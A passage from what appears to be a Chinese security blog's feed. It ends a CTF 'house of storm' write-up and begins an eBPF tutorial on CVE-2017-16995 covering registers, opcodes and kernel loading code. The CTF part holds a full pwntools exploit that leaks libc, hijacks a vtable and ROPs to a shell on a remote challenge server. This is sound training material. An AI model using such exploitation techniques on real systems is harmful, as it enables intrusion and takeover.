attack劫持IO_FILE的vtable然后直接执行one_gadget。</p><p>不过实际操作会发现所有的one_gadget都不符合条件，所以我们只能另辟蹊径。</p><p>这里我想到的是通过setcontext进行栈迁移，最后rop拿到shell。不过在puts中调用vtable时使用的寄存器为rax，这里需要有堆地址的寄存器位rdi，所以找到了一个magic gadget：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000065bca: mov rdi, rax; call qword ptr [rax + 0x20];</span><br></pre></td></tr></table></figure><h3 id="综上，exp-3"><a href="#综上，exp-3" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./house_of_storm&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./house_of_storm&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What size do you want?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to delete?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to modify?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What do you want to input?&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to see?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x510</span>)</span><br><span class="line">create(<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">0x500</span>)</span><br><span class="line">create(<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xc50</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x39bb78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)))</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, flat(pop_rdi, bin_sh, system))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x600</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">edit(<span class="number">0</span>, flat([libc_base+<span class="number">0x39bfa8</span>]*<span class="number">2</span>, <span class="number">0</span>, libc_base +</span><br><span class="line">     <span class="number">0x39c6f8</span>-<span class="number">0x20</span>, <span class="number">0</span>, libc_base+<span class="number">0x734f0</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0xC17)\nb*&#x27;+hex(libc_base+0x45226))</span></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0xE10)&#x27;)</span></span><br><span class="line">edit(<span class="number">2</span>, flat([libc_base+<span class="number">0x39bb78</span>]*<span class="number">2</span>,</span><br><span class="line">     [libc_base + <span class="number">0x45226</span>]*<span class="number">3</span>, libc_base+<span class="number">0x734f0</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">0x600</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0xE10)\nc&#x27;)</span></span><br><span class="line"><span class="comment"># edit(2, flat([libc_base+0x3c4b78]*2, [libc_base +</span></span><br><span class="line"><span class="comment">#      libc.symbols[&#x27;setcontext&#x27;]+53]*3, libc_base+0x6d99a))</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = flat([libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span>]</span><br><span class="line">               * <span class="number">5</span>, libc_base+<span class="number">0x65bca</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>-<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>) + \</span><br><span class="line">    flat(heap_base+<span class="number">0x520</span>, libc_base+<span class="number">0x205c2</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"><span class="comment"># edit(0, flat([libc_base+0x45226]*5, libc_base+0x7c990))</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这么多天做星盟的题会发现题目质量非常之高，需要对程序的运行，sandbox绕过机制，shellcode的熟练编写以及在堆题中找适合的gadget，有深刻的理解才可以完成解题。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;练题笔记&quot;&gt;&lt;a href=&quot;#练题笔记&quot; class=&quot;headerlink&quot; title=&quot;练题笔记&quot;&gt;&lt;/a&gt;练题笔记&lt;/h2&gt;&lt;p&gt;已经学了一段时间内核了，感觉自己在基础知识方面比较欠缺，所以打算回过头去看一下相关书籍深入学习一下基础知识，在学习途中保持p</summary>
      
    
    
    
    
    <category term="sandbox" scheme="https://cv196082.gitee.io/tags/sandbox/"/>
    
    <category term="shellcode" scheme="https://cv196082.gitee.io/tags/shellcode/"/>
    
    <category term="__libc_start_main" scheme="https://cv196082.gitee.io/tags/libc-start-main/"/>
    
    <category term="house of storm" scheme="https://cv196082.gitee.io/tags/house-of-storm/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-16995</title>
    <link href="https://cv196082.gitee.io/2022/10/10/CVE-2017-16995/"/>
    <id>https://cv196082.gitee.io/2022/10/10/CVE-2017-16995/</id>
    <published>2022-10-10T09:07:38.000Z</published>
    <updated>2022-11-22T09:04:51.963Z</updated>
    
    <content type="html"><![CDATA[<p>这一篇是作为ebpf的入门文章，所以会稍微介绍一下指令集，寄存器。可能篇幅略长。</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>该漏洞最早是由17年12月21号Google Project Zero团队的Jann Horn发现并报告的，编号为CVE-2017-16995。<br><strong>内核影响版本：</strong>Linux Kernel Version 4.14 ~ 4.4 。</p><h2 id="eBPF指令集介绍"><a href="#eBPF指令集介绍" class="headerlink" title="eBPF指令集介绍"></a>eBPF指令集介绍</h2><p>在认识一个新的指令集的第一步就是认识寄存器，在eBPF中存在十一个寄存器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">R0：一般用来表示函数返回值，包括整个 BPF 代码块（其实也可被看做一个函数）的返回值；</span><br><span class="line">R1~R5：一般用于表示内核预设函数的参数；</span><br><span class="line">R6~R9：在 BPF 代码中可以作存储用，其值不受内核预设函数影响；</span><br><span class="line">R10：只读，用作栈指针(SP)</span><br><span class="line">可理解对应为物理寄存器为：</span><br><span class="line">R0 – rax</span><br><span class="line">    R1 - rdi</span><br><span class="line">    R2 - rsi</span><br><span class="line">    R3 - rdx</span><br><span class="line">    R4 - rcx</span><br><span class="line">    R5 - r8</span><br><span class="line">    R6 - rbx</span><br><span class="line">    R7 - r13</span><br><span class="line">    R8 - r14</span><br><span class="line">    R9 - r15</span><br><span class="line">    R10 – rbp</span><br></pre></td></tr></table></figure><p>对于算数(ALU)和跳转(JMP)指令，8bit的代码字段分为三个部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------------+--------+--------------------+</span><br><span class="line">|   4 bits       |  1 bit |   3 bits           |</span><br><span class="line">| operation code | source | instruction class  |</span><br><span class="line">+----------------+--------+--------------------+</span><br><span class="line">(MSB)                                      (LSB)</span><br></pre></td></tr></table></figure><p>这里最后3bit LSB代表指令类型：    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">eBPF classes:</span><br><span class="line"></span><br><span class="line"> BPF_LD    <span class="number">0x00</span></span><br><span class="line"> BPF_LDX   <span class="number">0x01</span></span><br><span class="line"> BPF_ST    <span class="number">0x02</span></span><br><span class="line"> BPF_STX   <span class="number">0x03</span></span><br><span class="line"> BPF_ALU   <span class="number">0x04</span></span><br><span class="line"> BPF_JMP   <span class="number">0x05</span></span><br><span class="line"> BPF_JMP32 <span class="number">0x06</span></span><br><span class="line"> BPF_ALU64 <span class="number">0x07</span></span><br></pre></td></tr></table></figure><p>当<code>BPF_CLASS(code) == BPF_ALU or BPF_JMP</code>时,第四bit编码源操作数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BPF_K     <span class="number">0x00</span> ；代表将立即数作为源操作数</span><br><span class="line">BPF_X     <span class="number">0x08</span> ；代表将‘src_reg’作为源操作数</span><br></pre></td></tr></table></figure><p>前4bit的MSB用来存储操作码：</p><ol><li>如果 BPF_CLASS(code) == BPF_ALU or BPF_ALU64时，操作码会是下面的一个：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BPF_ADD   <span class="number">0x00</span></span><br><span class="line">BPF_SUB   <span class="number">0x10</span></span><br><span class="line">BPF_MUL   <span class="number">0x20</span></span><br><span class="line">BPF_DIV   <span class="number">0x30</span></span><br><span class="line">BPF_OR    <span class="number">0x40</span></span><br><span class="line">BPF_AND   <span class="number">0x50</span></span><br><span class="line">BPF_LSH   <span class="number">0x60</span></span><br><span class="line">BPF_RSH   <span class="number">0x70</span></span><br><span class="line">BPF_NEG   <span class="number">0x80</span></span><br><span class="line">BPF_MOD   <span class="number">0x90</span></span><br><span class="line">BPF_XOR   <span class="number">0xa0</span></span><br><span class="line">BPF_MOV   <span class="number">0xb0</span>  <span class="comment">/* eBPF only: mov reg to reg */</span></span><br><span class="line">BPF_ARSH  <span class="number">0xc0</span>  <span class="comment">/* eBPF only: sign extending shift right */</span></span><br><span class="line">BPF_END   <span class="number">0xd0</span>  <span class="comment">/* eBPF only: endianness conversion */</span></span><br></pre></td></tr></table></figure><ol start="2"><li>如果BPF_CLASS(code) == BPF_JMP or BPF_JMP32时，操作码将会是下面的一个：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BPF_JA    <span class="number">0x00</span>  <span class="comment">/* BPF_JMP only */</span></span><br><span class="line">BPF_JEQ   <span class="number">0x10</span></span><br><span class="line">BPF_JGT   <span class="number">0x20</span></span><br><span class="line">BPF_JGE   <span class="number">0x30</span></span><br><span class="line">BPF_JSET  <span class="number">0x40</span></span><br><span class="line">BPF_JNE   <span class="number">0x50</span>  <span class="comment">/* eBPF only: jump != */</span></span><br><span class="line">BPF_JSGT  <span class="number">0x60</span>  <span class="comment">/* eBPF only: signed &#x27;&gt;&#x27; */</span></span><br><span class="line">BPF_JSGE  <span class="number">0x70</span>  <span class="comment">/* eBPF only: signed &#x27;&gt;=&#x27; */</span></span><br><span class="line">BPF_CALL  <span class="number">0x80</span>  <span class="comment">/* eBPF BPF_JMP only: function call */</span></span><br><span class="line">BPF_EXIT  <span class="number">0x90</span>  <span class="comment">/* eBPF BPF_JMP only: function return */</span></span><br><span class="line">BPF_JLT   <span class="number">0xa0</span>  <span class="comment">/* eBPF only: unsigned &#x27;&lt;&#x27; */</span></span><br><span class="line">BPF_JLE   <span class="number">0xb0</span>  <span class="comment">/* eBPF only: unsigned &#x27;&lt;=&#x27; */</span></span><br><span class="line">BPF_JSLT  <span class="number">0xc0</span>  <span class="comment">/* eBPF only: signed &#x27;&lt;&#x27; */</span></span><br><span class="line">BPF_JSLE  <span class="number">0xd0</span>  <span class="comment">/* eBPF only: signed &#x27;&lt;=&#x27; */</span></span><br></pre></td></tr></table></figure><p>比如 <code>BPF_ADD | BPF_X | BPF_ALU</code>这条指令代表32位加法运算，将源寄存器的值加上目的寄存器的值，然后将结果存储到目的寄存器中：<code>dst_reg = (u32) dst_reg + (u32) src_reg;</code></p><p>并且，在eBPF指令集中没有了BPF_RET指令，用<code>BPF_JMP | BPF_EXIT</code>仅代替函数执行完退出，在函数退出之前，eBPF需要将返回值存储在R0中。</p><p>对于加载（LOAD）和存储(STORE)指令，8-bit的代码域分为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+--------+--------+-------------------+</span><br><span class="line">| <span class="number">3</span> bits | <span class="number">2</span> bits |   <span class="number">3</span> bits          |</span><br><span class="line">|  mode  |  size  | instruction <span class="class"><span class="keyword">class</span> |</span></span><br><span class="line"><span class="class">+--------+--------+-------------------+</span></span><br><span class="line"><span class="class">(<span class="title">MSB</span>)                             (<span class="title">LSB</span>)</span></span><br></pre></td></tr></table></figure><p>其中size分别有下面四种类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BPF_W   <span class="number">0x00</span>   ; word <span class="number">4</span> byte</span><br><span class="line">BPF_H   <span class="number">0x08</span>   ; half word <span class="number">2</span> byte</span><br><span class="line">BPF_B   <span class="number">0x10</span>   ; byte </span><br><span class="line">BPF_DW  <span class="number">0x18</span>   ; <span class="keyword">double</span> word <span class="number">8</span> byte</span><br></pre></td></tr></table></figure><p>并且在内核中，每一条指令的信息都储存在bpf_insn结构体中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">    __u8    code;       <span class="comment">/* opcode */</span></span><br><span class="line">    __u8    dst_reg:<span class="number">4</span>;  <span class="comment">/* dest register */</span></span><br><span class="line">    __u8    src_reg:<span class="number">4</span>;  <span class="comment">/* source register */</span></span><br><span class="line">    __s16   off;        <span class="comment">/* signed offset */</span></span><br><span class="line">    __s32   imm;        <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="eBPF代码加载执行流程-amp-检查分析"><a href="#eBPF代码加载执行流程-amp-检查分析" class="headerlink" title="eBPF代码加载执行流程 &amp; 检查分析"></a>eBPF代码加载执行流程 &amp; 检查分析</h2><h3 id="加载执行流程"><a href="#加载执行流程" class="headerlink" title="加载执行流程"></a>加载执行流程</h3><p>用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件来（如往socket写数据）来触发内核执行用户提供的eBPF代码。eBPF模块可以让用户加载数据包过滤代码（eBPF代码）进入内核，在收到数据包时触发eBPF代码执行。可以编写一个简单的用户数据包过滤程序来触发执行eBPF代码，具体流程如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr)) ；创建全局变量<span class="built_in">map</span>结构体，内核态用户态都可以访问。</span><br><span class="line">* syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr)) ；将用户态的BPF代码注入到内核，并对代码进行检查，并模拟执行。</span><br><span class="line">    * <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span> ；判断过滤模式</span></span><br><span class="line"><span class="function">        * <span class="keyword">int</span> <span class="title">bpf_check</span><span class="params">(struct bpf_prog **prog, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function">            * <span class="title">check_cfg</span><span class="params">(env)</span></span>; 第一轮检查，检查是否存在环路</span><br><span class="line">            * do_check(env);  第二轮检查，详细扫描BPF代码的运行过程，跟踪分析寄存器和堆栈，检查是否有不符合规则的情况出现</span><br><span class="line">    * <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __bpf_prog_run(<span class="keyword">void</span> *ctx, <span class="keyword">const</span> struct bpf_insn *insn)；运行BPF指令，最后真正运行的的函数。</span><br><span class="line">* setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd))；将eBPF与特定的事件绑定，在收到数据包时触发eBPF代码执行。</span><br></pre></td></tr></table></figure><h3 id="检查分析"><a href="#检查分析" class="headerlink" title="检查分析"></a>检查分析</h3><p>根据上述流程我们可以看到我们将BPF代码注入到内核中是发生在第二步中的，执行的函数为：<code>bpf_prog_load</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> <span class="title">type</span> =</span> attr-&gt;prog_type;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span></span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line">  <span class="keyword">char</span> license[<span class="number">128</span>];</span><br><span class="line">  <span class="keyword">bool</span> is_gpl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (CHECK_ATTR(BPF_PROG_LOAD))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy eBPF program license from user space */</span></span><br><span class="line">  <span class="keyword">if</span> (strncpy_from_user(license, u64_to_ptr(attr-&gt;license),</span><br><span class="line">                        <span class="keyword">sizeof</span>(license) - <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line">  license[<span class="keyword">sizeof</span>(license) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF programs must be GPL compatible to use GPL-ed functions */</span></span><br><span class="line">  is_gpl = license_is_gpl_compatible(license);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (attr-&gt;insn_cnt &gt;= BPF_MAXINSNS)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (type == BPF_PROG_TYPE_KPROBE &amp;&amp;</span><br><span class="line">      attr-&gt;kern_version != LINUX_VERSION_CODE)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">    <span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* plain bpf_prog allocation */</span></span><br><span class="line">  prog = bpf_prog_alloc(bpf_prog_size(attr-&gt;insn_cnt), GFP_USER);</span><br><span class="line">  <span class="keyword">if</span> (!prog)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  err = bpf_prog_charge_memlock(prog);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_prog_nouncharge;</span><br><span class="line"></span><br><span class="line">  prog-&gt;len = attr-&gt;insn_cnt;</span><br><span class="line"></span><br><span class="line">  err = -EFAULT;</span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(prog-&gt;insns, u64_to_ptr(attr-&gt;insns),</span><br><span class="line">                     prog-&gt;len * <span class="keyword">sizeof</span>(struct bpf_insn)) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">  prog-&gt;orig_prog = <span class="literal">NULL</span>;</span><br><span class="line">  prog-&gt;jited = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  atomic_set(&amp;prog-&gt;aux-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">  prog-&gt;gpl_compatible = is_gpl ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span 